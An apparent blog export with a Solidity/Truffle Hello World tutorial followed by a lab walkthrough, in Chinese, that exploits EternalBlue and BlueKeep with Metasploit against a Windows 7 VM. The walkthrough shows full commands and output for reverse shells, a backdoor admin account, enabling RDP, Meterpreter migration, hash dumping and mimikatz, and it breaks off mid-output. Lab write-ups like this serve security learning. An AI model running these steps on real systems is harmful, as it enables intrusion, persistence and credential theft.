由于语言内嵌框架是支持支付的，所以提供了一些关键字，如 payable，可以在语言层面直接支持支付，而且超级简单。 存储是使用网络上的区块链，数据的每一个状态都可以永久存储，所以需要确定变量使用内存，还是区块链。 运行环境是在去中心化的网络上，会比较强调合约或函数执行的调用的方式。因为原来一个简单的函数调用变为了一个网络上的节点中的代码执行，分布式的感觉。 最后一个非常大的不同则是它的异常机制，一旦出现异常，所有的执行都将会被回撤，这主要是为了保证合约执行的原子性，以避免中间状态出现的数据不一致。 Hello World下面尝试编写 Solidity 下的 Hello World。 第一步是安装 nodejs 和 npm，然后才能安装 truffle： 123456sudo apt updatesudo apt install npm nodejs nodejs-legacysudo npm install npm -gsudo npm install n -gsudo n stable # 下载稳定版 nodesudo npm install -g truffle truffle-contract web3 --unsafe-perm=true --allow-root 安装完 truffle 后，下载 Ganache 以方便搭建本地区块链环境（Ganache 在内存中模拟了一个区块链，因此每次 Ganache 关闭之后，区块链会丢失）。下载完后双击打开软件并启动本地环境。 各部分都成功安装之后，新建一个目录，并在目录下运行 truffle init： 1234567891011121314➜ HelloWorld truffle init✔ Preparing to download✔ Downloading✔ Cleaning up temporary files✔ Setting up boxUnbox successful. Sweet!Commands: Compile: truffle compile Migrate: truffle migrate Test contracts: truffle test 简单说明一下生成的几个文件： /contracts：存放智能合约原始代码的地方。 /migrations：这是 Truffle 用来部署智能合约的功能。 /test：测试智能合约的代码放在这里，支持 js 与 sol 测试。 truffle-config.js：Truffle 的设置文档。 Solidity 中合约的含义就是一组代码（函数）和数据（状态），它们位于以太坊区块链的一个特定地址上。关键字 pragma 告知编译器源代码所适用的 Solidity 版本为 &gt;=0.4.0 及 &lt;0.7.0，为了确保合约不会在新的编译器版本中突然行为异常。 关键字 contract 即为指定合约，关键字 function 指定函数。public 指定函数的公开权限，view 用来标识那些不改变存储状态的方法（相比之下而 pure 更加严格，它修饰的方法不但不改变存贮状态，也不读取存储的变量值），returns 指定返回值的数据类型。 注意：所有的标识符（合约名称，函数名称和变量名称）都只能使用 ASCII 字符集。UTF-8 编码的数据可以用字符串变量的形式存储；小心使用 Unicode 文本，因为有些字符虽然长得相像（甚至一样），但其字符码是不同的，其编码后的字符数组也会不一样。 以下为一个简单的返回 Hello World 的函数： 1234567pragma solidity &gt;=0.4.0 &lt;0.7.0;contract HelloWorld &#123; function sayHello() public view returns (string memory) &#123; return &quot;Hello World&quot;; &#125;&#125; 然后输入 truffle compile 进行编译： 12345678910111213141516➜ HelloWorld truffle compileCompiling your contracts...===========================&gt; Compiling ./contracts/HelloWorld.sol&gt; Compiling ./contracts/Migrations.sol &gt; compilation warnings encountered:/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:4:3: Warning: Function state mutability can be restricted to pure function sayHello() public view returns (string memory) &#123; ^ (Relevant source part starts here and spans across multiple lines).&gt; Artifacts written to /home/assassinq/SmartContract/HelloWorld/build/contracts&gt; Compiled successfully using: - solc: 0.5.8+commit.23d335f2.Emscripten.clang 接下来我们需要在 migrations 下添加一个部署文件 2_deploy_contracts.js，用来待会儿对 HelloWorld.sol 的部署。部署文件的文件名要求以数字为前缀，后缀为描述。编号前缀是必需的，以便记录迁移是否成功运行，后缀纯粹是为了方便理解。 注意：编号还有记录运行迁移文件顺序的作用。 使用 artifacts.require 语句来取得准备部署的合约。使用 deployer.deploy 语句将合约部署到区块链上。这边 HelloWorld 是 contract 的名称而不是文件名。因此可以用此语法读入任一 .sol 文件中的任一合约。 12345const HelloWorld = artifacts.require(\"HelloWorld\");module.exports = function(deployer) &#123; deployer.deploy(HelloWorld);&#125;; 在确保之前的 Ganache 已经启动并生成了十个账户后，输入 truffle migrate 将合约部署到 Ganache 上。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667➜ HelloWorld truffle migrateCompiling your contracts...===========================&gt; Everything is up to date, there is nothing to compile.Starting migrations...======================&gt; Network name: &apos;ganache&apos;&gt; Network id: 5777&gt; Block gas limit: 0x6691b71_initial_migration.js====================== Deploying &apos;Migrations&apos; ---------------------- &gt; transaction hash: 0xc3b75999936e57ba192b2053a581762c1f235aad3090caea5572c3deb1d98802 &gt; Blocks: 0 Seconds: 0 &gt; contract address: 0x55a333d4f932a737E0b97af4E3F8F4E971600D43 &gt; block number: 5 &gt; block timestamp: 1569581737 &gt; account: 0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0 &gt; balance: 99.98561934 &gt; gas used: 261393 &gt; gas price: 20 gwei &gt; value sent: 0 ETH &gt; total cost: 0.00522786 ETH &gt; Saving migration to chain. &gt; Saving artifacts ------------------------------------- &gt; Total cost: 0.00522786 ETH2_deploy_contracts.js===================== Deploying &apos;HelloWorld&apos; ---------------------- &gt; transaction hash: 0x9c05c079cbdbb90a3d53fdf5e66e3a79fce1a0e5f633815068c9a82aaaf912b0 &gt; Blocks: 0 Seconds: 0 &gt; contract address: 0x4752C4f381D9e492e10daCCf9213d916bd1f8caF &gt; block number: 7 &gt; block timestamp: 1569581739 &gt; account: 0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0 &gt; balance: 99.98223486 &gt; gas used: 127201 &gt; gas price: 20 gwei &gt; value sent: 0 ETH &gt; total cost: 0.00254402 ETH &gt; Saving migration to chain. &gt; Saving artifacts ------------------------------------- &gt; Total cost: 0.00254402 ETHSummary=======&gt; Total deployments: 2&gt; Final cost: 0.00777188 ETH 最后执行 truffle console，可以使用 js 与刚才部署的合约进行交互： 1234truffle(ganache)&gt; let x = await HelloWorld.deployed()undefinedtruffle(ganache)&gt; x.sayHello()&apos;Hello World&apos; 我们还可以尝试添加一个函数 echo，可以输出我们传入的字符串： 1234567891011pragma solidity &gt;=0.4.0 &lt;0.7.0;contract HelloWorld &#123; function sayHello() public view returns (string memory) &#123; return &quot;Hello World&quot;; &#125; function echo(string memory name) public view returns (string memory) &#123; return name; &#125;&#125; 要重新编译 Truffle 项目里的合约，请切换到项目工程所在根目录。后续运行中，Truffle 将仅编译自上次编译以来有更改的合约，如果想覆盖可以使用 --all 选项。 123456789101112131415161718➜ HelloWorld truffle compileCompiling your contracts...===========================&gt; Compiling ./contracts/HelloWorld.sol &gt; compilation warnings encountered:/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:4:3: Warning: Function state mutability can be restricted to pure function sayHello() public view returns (string memory) &#123; ^ (Relevant source part starts here and spans across multiple lines).,/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:8:3: Warning: Function state mutability can be restricted to pure function echo(string memory name) public view returns (string memory) &#123; ^ (Relevant source part starts here and spans across multiple lines).&gt; Artifacts written to /home/assassinq/SmartContract/HelloWorld/build/contracts&gt; Compiled successfully using: - solc: 0.5.8+commit.23d335f2.Emscripten.clang 部署时需要加上 --reset 参数进行重新部署。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667➜ HelloWorld truffle migrate --resetCompiling your contracts...===========================&gt; Everything is up to date, there is nothing to compile.Starting migrations...======================&gt; Network name: &apos;ganache&apos;&gt; Network id: 5777&gt; Block gas limit: 0x6691b71_initial_migration.js====================== Replacing &apos;Migrations&apos; ---------------------- &gt; transaction hash: 0x73d288f20ed2d68fe565fb01e8a15ba1a591c0cfd642028b45056fc057c194e6 &gt; Blocks: 0 Seconds: 0 &gt; contract address: 0x48245c079FA8558a35629BC9b8A94b00c91eD9A9 &gt; block number: 9 &gt; block timestamp: 1569581861 &gt; account: 0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0 &gt; balance: 99.97646654 &gt; gas used: 261393 &gt; gas price: 20 gwei &gt; value sent: 0 ETH &gt; total cost: 0.00522786 ETH &gt; Saving migration to chain. &gt; Saving artifacts ------------------------------------- &gt; Total cost: 0.00522786 ETH2_deploy_contracts.js===================== Replacing &apos;HelloWorld&apos; ---------------------- &gt; transaction hash: 0x8a7ca29c50f2e2f5645a9b4c33e5ca0eb6ab50def348c2ebcfe2f6fd38d9851e &gt; Blocks: 0 Seconds: 0 &gt; contract address: 0x0d12C183e366AE74393346ae33d4b662bfB5492F &gt; block number: 11 &gt; block timestamp: 1569581862 &gt; account: 0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0 &gt; balance: 99.97130642 &gt; gas used: 215983 &gt; gas price: 20 gwei &gt; value sent: 0 ETH &gt; total cost: 0.00431966 ETH &gt; Saving migration to chain. &gt; Saving artifacts ------------------------------------- &gt; Total cost: 0.00431966 ETHSummary=======&gt; Total deployments: 2&gt; Final cost: 0.00954752 ETH 最后进行交互： 123456truffle(ganache)&gt; let x = await HelloWorld.deployed()undefinedtruffle(ganache)&gt; x.sayHello()&apos;Hello World&apos;truffle(ganache)&gt; x.echo(&apos;This is assassinq.&apos;)&apos;This is assassinq.&apos; Referenceshttps://blog.csdn.net/liyuechun520/article/details/78036363https://blog.csdn.net/weixin_42595515https://www.jianshu.com/p/983122b8243ehttp://blog.sina.com.cn/s/blog_bad31d930102xa1l.html","categories":[],"tags":[{"name":"sol","slug":"sol","permalink":"qianfei11.coding.me/tags/sol/"},{"name":"blockchain","slug":"blockchain","permalink":"qianfei11.coding.me/tags/blockchain/"}]},{"title":"Have Fun with Metasploit-Framework","slug":"Have-Fun-with-Metasploit-Framework","date":"2019-09-16T08:51:20.000Z","updated":"2019-09-24T08:42:29.858Z","comments":true,"path":"2019/09/16/Have-Fun-with-Metasploit-Framework/","link":"","permalink":"qianfei11.coding.me/2019/09/16/Have-Fun-with-Metasploit-Framework/","excerpt":"使用 Metasploit-Framework 复现 EternalBlue 以及 BlueKeep。","text":"使用 Metasploit-Framework 复现 EternalBlue 以及 BlueKeep。 Metasploit-FrameworkMetasploit 项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。其最为知名的子项目是开源的 Metasploit 框架，一套针对远程主机进行开发和执行“exploit 代码”的工具。其他重要的子项目包括 Opcode 数据库、shellcode 档案、安全研究等内容。 在本实验中使用 Kali Linux 下的 Metasploit Framework。 Environment VMware Fusion：专业版 11.1.0 LHOST：Kali Rolling (2019.2) x64（IP：192.168.1.109） RHOST：Windows 7 SP1 旗舰版 (64 位)（IP：192.168.1.102） EternalBlueIntro永恒之蓝是美国国家安全局开发的漏洞利用程序，于 2017 年 4 月 14 日被黑客组织影子掮客泄漏。该工具利用 445/TCP 端口的档案分享协议的漏洞进行散播。尽管微软于 2017 年 3 月 14 日已经发布过 Microsoft Windows 补丁修补了这个漏洞，然而在 5 月 12 日 WannaCry 勒索软体利用这个漏洞传播时，很多用户仍然因为没有安装补丁而受害。由于 WannaCry 的严重性，微软于 2017 年 5 月 13 日为已超过支持周期的 Microsoft Windows XP、Microsoft Windows 8 和 Windows Server 2003 发布了紧急安全更新，以阻止其散布造成更大的危害。 下面通过 Metasploit Framework 对 EternalBlue 进行利用。 Scan先使用 auxiliary/scanner/smb/smb_ms17_010 模块对靶机进行扫描： 12345678910111213141516171819202122232425msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.1.102rhosts =&gt; 192.168.1.102msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show optionsModule options (auxiliary/scanner/smb/smb_ms17_010): Name Current Setting Required Description ---- --------------- -------- ----------- CHECK_ARCH true no Check for architecture on vulnerable hosts CHECK_DOPU true no Check for DOUBLEPULSAR on vulnerable hosts CHECK_PIPE false no Check for named pipe on vulnerable hosts NAMED_PIPES /usr/share/metasploit-framework/data/wordlists/named_pipes.txt yes List of named pipes to check RHOSTS 192.168.1.102 yes The target address range or CIDR identifier RPORT 445 yes The SMB service port (TCP) SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as THREADS 1 yes The number of concurrent threadsmsf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run[+] 192.168.1.102:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)[*] 192.168.1.102:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed Exploit确定存在漏洞后使用 exploit/windows/smb/ms17_010_eternalblue 模块攻击，并得到 CMD Shell： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556msf5 &gt; use exploit/windows/smb/ms17_010_eternalbluemsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.1.102rhosts =&gt; 192.168.1.102msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show optionsModule options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 192.168.1.102 yes The target address range or CIDR identifier RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target.Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packsmsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit[*] Started reverse TCP handler on 192.168.1.109:4444[+] 192.168.1.102:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)[*] 192.168.1.102:445 - Connecting to target for exploitation.[+] 192.168.1.102:445 - Connection established for exploitation.[+] 192.168.1.102:445 - Target OS selected valid for OS indicated by SMB reply[*] 192.168.1.102:445 - CORE raw buffer dump (38 bytes)[*] 192.168.1.102:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61 Windows 7 Ultima[*] 192.168.1.102:445 - 0x00000010 74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 te 7601 Service[*] 192.168.1.102:445 - 0x00000020 50 61 63 6b 20 31 Pack 1[+] 192.168.1.102:445 - Target arch selected valid for arch indicated by DCE/RPC reply[*] 192.168.1.102:445 - Trying exploit with 12 Groom Allocations.[*] 192.168.1.102:445 - Sending all but last fragment of exploit packet[*] 192.168.1.102:445 - Starting non-paged pool grooming[+] 192.168.1.102:445 - Sending SMBv2 buffers[+] 192.168.1.102:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.[*] 192.168.1.102:445 - Sending final SMBv2 buffers.[*] 192.168.1.102:445 - Sending last fragment of exploit packet![*] 192.168.1.102:445 - Receiving response from exploit packet[+] 192.168.1.102:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)![*] 192.168.1.102:445 - Sending egg to corrupted connection.[*] 192.168.1.102:445 - Triggering free of corrupted buffer.[*] Command shell session 1 opened (192.168.1.109:4444 -&gt; 192.168.1.102:49161) at 2019-09-17 02:41:44 -0400[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=C:\\Windows\\system32&gt; BlueKeepIntroBlueKeep（CVE-2019-0708）是 Microsoft 远程桌面协议实现中发现的一个安全漏洞，它允许远程执行代码。首次报告于 2019 年 5 月，它存在于从 Windows 2000 到 Windows Server 2008 R2 和 Windows 7 的所有未修补的基于 Windows NT 的 Microsoft Windows 版本中。Microsoft 发布了一个安全补丁（包括几个版本的带外更新） 在 2019 年 5 月 14 日，已经达到其寿命结束的 Windows，例如 Windows XP。在 2019 年 8 月 13 日，据报道，相关的 BlueKeep 安全漏洞（统称为 DejaBlue）会影响较新的 Windows 版本，包括 Windows 7 和所有最新版本 高达 Windows 10 的操作系统，以及较旧的 Windows 版本。2019 年 9 月 6 日，Metasploit 利用可疑的 BlueKeep 安全漏洞宣布已经发布到公共领域。 下面通过 Metasploit Framework 对 BlueKeep 进行利用，具体脚本来自 Github。 Scan先使用 auxiliary/scanner/rdp/cve_2019_0708_bluekeep 模块对靶机进行扫描： 12345678910111213141516171819202122232425262728293031msf5 &gt; use auxiliary/scanner/rdp/cve_2019_0708_bluekeepmsf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; set rhosts 192.168.1.102rhosts =&gt; 192.168.1.102msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; show optionsModule options (auxiliary/scanner/rdp/cve_2019_0708_bluekeep): Name Current Setting Required Description ---- --------------- -------- ----------- RDP_CLIENT_IP 192.168.0.100 yes The client IPv4 address to report during connect RDP_CLIENT_NAME rdesktop no The client computer name to report during connect, UNSET = random RDP_DOMAIN no The client domain name to report during connect RDP_USER no The username to report during connect, UNSET = random RHOSTS 192.168.1.102 yes The target address range or CIDR identifier RPORT 3389 yes The target port (TCP) THREADS 1 yes The number of concurrent threadsAuxiliary action: Name Description ---- ----------- Scan Scan for exploitable targetsmsf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; run[*] 192.168.1.102:3389 - Detected RDP on 192.168.1.102:3389 (Windows version: 6.1.7601) (Requires NLA: No)[+] 192.168.1.102:3389 - The target is vulnerable.[*] 192.168.1.102:3389 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed Exploit确定存在漏洞后使用 exploit/windows/smb/ms17_010_eternalblue 模块攻击，并得到 CMD Shell： 12345678910111213141516171819202122232425262728293031323334353637383940msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rcemsf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhosts 192.168.1.102rhosts =&gt; 192.168.1.102msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set target 3target =&gt; 3msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; show optionsModule options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce): Name Current Setting Required Description ---- --------------- -------- ----------- RDP_CLIENT_IP 192.168.0.100 yes The client IPv4 address to report during connect RDP_CLIENT_NAME ethdev no The client computer name to report during connect, UNSET = random RDP_DOMAIN no The client domain name to report during connect RDP_USER no The username to report during connect, UNSET = random RHOSTS 192.168.1.102 yes The target address range or CIDR identifier RPORT 3389 yes The target port (TCP)Exploit target: Id Name -- ---- 3 Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare)msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit[*] Started reverse TCP handler on 192.168.1.109:4444[*] 192.168.1.102:3389 - Detected RDP on 192.168.1.102:3389 (Windows version: 6.1.7601) (Requires NLA: No)[+] 192.168.1.102:3389 - The target is vulnerable.[*] 192.168.1.102:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028600000, Channel count 1.[*] 192.168.1.102:3389 - Surfing channels ...[*] 192.168.1.102:3389 - Lobbing eggs ...[*] 192.168.1.102:3389 - Forcing the USE of FREE&apos;d object ...[*] Command shell session 2 opened (192.168.1.109:4444 -&gt; 192.168.1.102:49162) at 2019-09-17 02:47:40 -0400C:\\Windows\\system32&gt; Post Exploitation在获取到 CMD Shell 之后可以做更多好玩的事情，比如使用 Meterpreter 进行后渗透等等，这里只记录一部分。 新建用户并进行远程连接在得到一个 CMD Shell 后，可以新建一个用户并加入管理员组： 12345678C:\\Windows\\system32&gt;net user hacker hacker /addnet user hacker hacker /add����ɹ���ɡ�C:\\Windows\\system32&gt;net localgroup administrators hacker /addnet localgroup administrators hacker /add����ɹ���ɡ� 开启远程连接： 12C:\\Windows\\system32&gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f����ɹ���ɡ� 然后使用 Kali 下的远程桌面进行连接，使用新创建的用户 hacker 登录： 12rdesktop 192.168.1.102:3389# rdesktop 192.168.1.102 -u hacker -p hacker 将普通的 CMD Shell 升级为 Meterpreter原本的 CMD Shell 可以做的事情有限，使用 sessions 命令升级到 Meterpreter 可以做更多好玩的事。 12345678910111213141516171819202122232425262728293031msf5 &gt; sessionsActive sessions=============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\\Windows\\s... 192.168.1.109:4444 -&gt; 192.168.1.102:49161 (192.168.1.102) 2 shell x64/windows Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\\Windows\\s... 192.168.1.109:4444 -&gt; 192.168.1.102:49162 (192.168.1.102)msf5 &gt; sessions -u 1[*] Executing &apos;post/multi/manage/shell_to_meterpreter&apos; on session(s): [1][*] Upgrading session ID: 1[*] Starting exploit/multi/handler[*] Started reverse TCP handler on 192.168.1.109:4433msf5 &gt;[*] Sending stage (179779 bytes) to 192.168.1.102[*] Meterpreter session 3 opened (192.168.1.109:4433 -&gt; 192.168.1.102:49163) at 2019-09-17 02:55:12 -0400[*] Stopping exploit/multi/handlermsf5 &gt; sessionsActive sessions=============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\\Windows\\s... 192.168.1.109:4444 -&gt; 192.168.1.102:49161 (192.168.1.102) 2 shell x64/windows Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\\Windows\\s... 192.168.1.109:4444 -&gt; 192.168.1.102:49162 (192.168.1.102) 3 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ WIN-Q595JS8OROC 192.168.1.109:4433 -&gt; 192.168.1.102:49163 (192.168.1.102) 多了一个 session 3，打开后得到 Meterpreter 的 Shell： 1234msf5 &gt; sessions 3[*] Starting interaction with 3...meterpreter &gt; 然后可以看到得到的 Meterpreter 是 32 位的，可以通过把它绑定到某个 64 位的程序（所属用户为 SYSTEM）来修改成 64 位： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283meterpreter &gt; sysinfoComputer : WIN-Q1ST6EBNLTROS : Windows 7 (Build 7601, Service Pack 1).Architecture : x64System Language : zh_CNDomain : WORKGROUPLogged On Users : 2Meterpreter : x86/windowsmeterpreter &gt; psProcess List============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x64 0 100 780 audiodg.exe x64 0 268 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\smss.exe 352 344 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 404 344 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wininit.exe 416 396 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 420 2584 mscorsvw.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorsvw.exe 464 396 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\winlogon.exe 512 404 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\services.exe 520 404 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsass.exe 528 404 lsm.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsm.exe 572 512 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 632 512 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 696 512 vmacthlp.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\VMware\\VMware Tools\\vmacthlp.exe 728 512 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 780 512 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 896 512 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 960 2584 mscorsvw.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorsvw.exe 964 512 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 1096 512 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 1192 512 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe 1228 512 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 1240 512 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 1300 512 msdtc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 1440 512 VGAuthService.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe 1464 512 vmtoolsd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe 1624 512 sppsvc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 1704 512 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 1744 512 mscorsvw.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\mscorsvw.exe 1768 512 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 1836 352 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 1844 512 dllhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\dllhost.exe 1860 632 WmiPrvSE.exe 1984 512 dllhost.exe x64 0 NT AUTHORITY\\SYSTEM 2000 512 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 2084 512 VSSVC.exe x64 0 NT AUTHORITY\\SYSTEM 2116 2424 cmd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\cmd.exe 2192 2116 powershell.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 2228 632 WmiPrvSE.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wbem\\WmiPrvSE.exe 2320 512 taskhost.exe x64 1 WIN-Q1ST6EBNLTR\\victim C:\\Windows\\System32\\taskhost.exe 2368 352 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 2392 896 dwm.exe x64 1 WIN-Q1ST6EBNLTR\\victim C:\\Windows\\System32\\dwm.exe 2404 2384 explorer.exe x64 1 WIN-Q1ST6EBNLTR\\victim C:\\Windows\\explorer.exe 2424 1192 cmd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\cmd.exe 2516 512 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 2548 512 WmiApSrv.exe x64 0 NT AUTHORITY\\SYSTEM 2584 512 mscorsvw.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorsvw.exe 2756 512 SearchIndexer.exe x64 0 NT AUTHORITY\\SYSTEM 2852 2756 SearchFilterHost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\SearchFilterHost.exe 2888 2756 SearchProtocolHost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\SearchProtocolHost.exe 2968 2404 cmd.exe x64 1 WIN-Q1ST6EBNLTR\\victim C:\\Windows\\System32\\cmd.exe 2976 416 conhost.exe x64 1 WIN-Q1ST6EBNLTR\\victim C:\\Windows\\System32\\conhost.exe 3060 3020 powershell.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exemeterpreter &gt; migrate 2368[*] Migrating from 3060 to 2368...[*] Migration completed successfully.meterpreter &gt; sysinfoComputer : WIN-Q1ST6EBNLTROS : Windows 7 (Build 7601, Service Pack 1).Architecture : x64System Language : zh_CNDomain : WORKGROUPLogged On Users : 2Meterpreter : x64/windowsmeterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEM 获取用户密码利用 hashdump 可以获得所有用户密码的哈希值： 1234567891011121314151617181920212223meterpreter &gt; run hashdump[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...][*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY a648199744904bf08ff1b92b5b224011.../usr/share/metasploit-framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated[*] Obtaining the user list and keys...[*] Decrypting user keys.../usr/share/metasploit-framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated/usr/share/metasploit-framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated/usr/share/metasploit-framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated[*] Dumping password hints...No users with password hints on this system[*] Dumping password hashes...Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::victim:1000:aad3b435b51404eeaad3b435b51404ee:3008c87294511142799dca1191e69a0f:::hacker:1001:aad3b435b51404eeaad3b435b51404ee:5e7599f673df11d5c5c4d950f5bf0157::: 使用神器 mimikatz 有可能能得到密码的明文： 1234567891011121314151617meterpreter &gt; load mimikatzLoading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &apos;load kiwi&apos; instead?Success.meterpreter &gt; wdigest[+] Running as SYSTEM[*] Retrieving wdigest credentialswdigest credentials===================AuthID Package Domain User Password------ ------- ------ ---- --------0;997 Negotiate NT 